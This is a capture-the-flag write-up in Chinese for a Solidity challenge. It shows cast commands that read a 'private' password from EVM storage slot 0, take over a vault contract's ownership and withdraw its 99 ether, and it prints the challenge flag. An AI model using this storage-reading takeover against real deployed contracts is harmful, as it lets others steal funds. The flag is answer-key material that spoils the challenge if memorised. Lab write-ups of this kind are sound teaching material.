# Prayvate Vault

## 题目简述

`EtherVault` 持有 `99 ether`，`Setup.isSolved()` 要求余额降为零。提款函数只允许 `owner` 调用；但用于更换 owner 的 `bytes16 password` 只是 Solidity `private` 状态变量，位于合约 storage slot 0。公共链存储透明可读，因此可以恢复密码、接管 owner 后提款。

## 解题过程

先取得目标地址并读取 slot 0：

```bash
TARGET=$(cast call "$SETUP" "TARGET()(address)" --rpc-url "$RPC")
PASSWORD_WORD=$(cast storage "$TARGET" 0 --rpc-url "$RPC")
```

槽中有效的 16 字节就是 `password`。把它作为 `bytes16` 参数，与玩家地址一起传给 `changeAccount`：

```bash
cast send "$TARGET" "changeAccount(address,bytes16)" \
  "$PLAYER_ADDRESS" "$PASSWORD" \
  --rpc-url "$RPC" \
  --private-key "$PLAYER_PRIVATE_KEY"
```

读取 `owner()` 确认所有权已经改变：

```bash
cast call "$TARGET" "owner()(address)" --rpc-url "$RPC"
```

`safeWithdraw(value)` 会把参数乘以 $10^{18}$ 后按 wei 转账，因此传入 `99` 即可提走全部余额：

```bash
cast send "$TARGET" "safeWithdraw(uint256)" 99 \
  --rpc-url "$RPC" \
  --private-key "$PLAYER_PRIVATE_KEY"
```

随后 `isSolved()` 返回 `true`。官方解法给出的 flag 为：

```text
shellmates{pr1v4CY?__0R_PR4Y_tH4t_THeY_w0n7_sEE?}
```

## 方法总结

- 核心技巧：直接读取 EVM storage，恢复 `private bytes16` 认证值并接管合约所有权。
- 识别信号：链上合约把密码、密钥或随机种子保存在普通状态变量中，即使声明为 `private`，也不能视为机密。
- 复用要点：先根据声明顺序和 packing 规则定位槽，再确认短值对齐；真正的链上授权不应依赖可公开读取的静态秘密。
